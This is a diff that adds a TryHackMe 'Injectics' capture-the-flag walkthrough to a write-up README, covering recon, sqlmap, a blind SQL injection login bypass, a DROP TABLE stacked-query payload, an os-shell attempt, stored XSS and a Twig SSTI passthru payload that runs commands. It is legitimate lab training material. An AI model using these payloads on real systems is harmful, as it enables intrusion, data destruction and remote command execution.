@@ -10,6 +10,191 @@
 ## [Attacktive Directory](https://github.com/zinzloun/THM_WriteUP/blob/main/README.md#attacktive-directory)
 ## [Hammer](https://github.com/zinzloun/THM_WriteUP/blob/main/README.md#hammer)
 
+## Injectics
+
+### 🔍 Service Enumeration
+
+#### Fast Port Scan
+```bash
+rustscan -b 1000 -a 10.10.149.162
+```
+
+#### Service Fingerprinting
+```bash
+nmap -sVC 10.10.149.162 -p 22,80
+```
+
+### 🌐 Web Application Recon
+
+Check the HTML source for useful information. A mail suggests that some sensitive logic or files may be exposed in the web root.
+
+#### Directory/File Discovery
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.149.162/FUZZ.php -mc 200 -c
+```
+
+Discovered two login forms. We attempted SQL injection.
+
+---
+
+### 🩻 SQL Injection
+
+#### Exploit with `sqlmap`
+```bash
+sqlmap -r login.req --batch --risk=3 --level=5 --dbms=mysql
+```
+
+`sqlmap` returned:
+```
+POST parameter 'username' is vulnerable.
+
+Type: time-based blind  
+Title: MySQL >= 5.0.12 RLIKE time-based blind  
+Payload: username=aaa' RLIKE SLEEP(5)-- &password=aaaa&function=login
+```
+
+#### Manual Verification with Burp
+
+```http
+POST /functions.php HTTP/1.1
+Host: 10.10.149.162
+Cookie: PHPSESSID=2fkl1is7mrf3utmuodijmgh9bm
+Content-Type: application/x-www-form-urlencoded
+
+username=' RLIKE SLEEP(5)-- &password=aaaa&function=login
+```
+
+Response:
+```json
+{"status":"success","message":"Login successful","is_admin":"true",...}
+```
+
+✅ Although it's a blind SQLi, it still allows login—possibly due to poor failover logic on the server.
+
+---
+
+### 🧑‍💻 Dashboard Access
+
+Log in as the user `dev` using the session cookie (e.g., `PHPSESSID=2fkl1is7mrf3utmuodijmgh9bm`).
+
+#### Exploiting Update Logic
+
+Tested SQL injection in the `bronze` field by setting:
+```
+bronze = 1 --
+```
+
+🛑 **Warning**: This is **very invasive**: it updates all records in the table. Avoid in real engagements.
+
+---
+
+#### Dropping the table (Admin Access)
+
+From the email found, we know that admin access is granted after deleting a specific table.
+
+Payload:
+```
+bronze = 10;DROP TABLE xxxxx --
+```
+
+The semicolon chains a second query, and the comment skips the original `WHERE` clause.
+
+If successful, a warning message appears:
+> "Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes."
+
+Then, log in from the **admin login page** using credentials from the email log.
+
+---
+
+### 🏴 Getting the Second Flag
+
+### Out-of-Band Exploitation Attempts
+
+Tried:
+```sql
+;SELECT '' INTO OUTFILE '/var/www/html/test.txt' --
+```
+
+But writing to files was **not allowed**.
+
+Also attempted to upload a shell, but failed due to **lack of write permissions** to the webroot.
+
+Tried:
+```bash
+sqlmap -u "http://10.10.239.164/edit_leaderboard.php" \
+--data="rank=1&country=&gold=22&silver=21&bronze=150" \
+--cookie="PHPSESSID=9odjnokt0bvou7p21uothquevs" \
+-p bronze --dbms=MySQL --level=5 --risk=3 --technique=B --os-shell
+```
+
+---
+
+### 🔐 Profile Update Function
+
+Discovered a new "Update Profile" function. The first name is echoed on the dashboard, so I tested for XSS and SQLi.
+
+✅ **Stored XSS** is present, but **not useful** for this context.
+
+---
+
+### 🧭 Enumeration Pays Off
+
+After being stuck, I returned to the basics: **enumerate, enumerate, enumerate...**
+
+### Deeper File Enumeration
+```bash
+ffuf -u http://10.10.239.164/FUZZ \
+-w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
+-e .txt,.config,.json,.xml,.env,.ini,.bak,.old,.log,.sql \
+-t 50 -c --fw 0 -mc 200
+```
+
+Discovered an interesting `.json` file indicating the use of **Twig 2.14.0**.
+
+---
+
+## 🧬 SSTI Exploitation
+
+Since the box is about injections, I assumed SSTI was present.
+
+Basic payloads:
+```twig
+{{ 2*5 }}              → 10  
+{{ 'test' ~ '123' }}   → test123
+```
+
+So SSTI was confirmed.
+
+However, command execution was tricky. After spending ~2 hours stuck, I checked [this write-up](https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics)
+
+Discovered that **PHP's `passthru()`** is used in a custom Twig filter.
+
+---
+
+### What is `passthru()`?
+
+> `passthru()` is a PHP function used to execute a system command (shell command) and send the raw output directly to standard output (typically the terminal or web page).
+
+---
+
+### Confirmation payload
+```twig
+fname={{ ['id','']|sort('passthru') }}
+```
+
+Returned:
+```
+Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) Array!
+```
+
+Then it was just a matter to sort out how to execute the following commands through SSTI:
+```bash
+ls flags
+cat flags/hidden_file.txt
+```
+
+
+
 ## Hammer
 ## Flag 1
 - Rustscan to find services
